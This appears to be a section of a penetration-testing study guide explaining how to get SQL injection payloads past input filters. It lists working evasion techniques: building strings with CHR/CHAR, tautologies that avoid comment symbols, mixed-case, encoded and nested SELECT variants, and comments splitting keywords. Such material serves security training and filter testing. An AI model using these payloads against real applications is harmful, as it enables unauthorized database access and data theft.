# Bypassing Filters

Some applications attempt to sanitize or block SQL injection attacks using input filters. These are often flawed or incomplete and can be bypassed using creative techniques.

---

## **Avoiding Blocked Characters**

If certain characters are stripped or encoded, try alternatives to achieve your goals:

- **Single Quote Alternatives**:
  - Not needed if injecting into **numeric fields** or **column names**.
  - You can **construct strings dynamically** using ASCII functions.

  **Oracle**:
  ```sql
  SELECT ename, sal 
  FROM emp 
  WHERE ename=CHR(109)||CHR(97)||CHR(114)||CHR(99)||CHR(117)||CHR(115)
  ```

  **MS-SQL**:
  ```sql
  SELECT ename, sal 
  FROM emp 
  WHERE ename=CHAR(109)+CHAR(97)+CHAR(114)+CHAR(99)+CHAR(117)+CHAR(115)
  ```

- **Comment Symbol Blocked?**  
  Structure your input so comments aren't required:
  ```sql
  ' OR 1=1--        →   ' OR 'a'='a
  ```

- **Semicolon Blocked in MS-SQL?**  
  You can still perform **batched queries** without a semicolon if the syntax remains valid.

---

## **Circumventing Simple Validation**

When input is sanitized using blacklists, look for poor validation or canonicalization.

**Examples:**
- If `SELECT` is blocked try:
  ```sql
  SeLeCt
  %00SELECT
  SELSELECTECT
  %53%45%4c%45%43%54
  %2553%2545%254c%2545%2543%2554
  ```

---

## **Using SQL Comments**

- **Standard inline comments** can simulate whitespace:
  ```sql
  SELECT/*foo*/username,password/*foo*/FROM/*foo*/users
  ```

- **MySQL-specific comment injection inside keywords**:
  ```sql
  SEL/*foo*/ECT username,password FR/*foo*/OM users
  ```

  ➤ This is effective against filters that match exact SQL keyword tokens.

---

## **Exploiting Defective Filters**

Many filters have **logical flaws**, such as:

- **Order-of-operations bugs** (e.g., decoding after filtering)
- **Non-recursive sanitization** (applies only once)

You can often **smuggle blocked payloads** by exploiting these oversights.

➤ These techniques are covered more deeply in **Chapter 11**.

---

## TIP

*Always test variations of casing, encoding, and structure. Poorly written filters often match exact strings or fail to decode input before validation.*

---
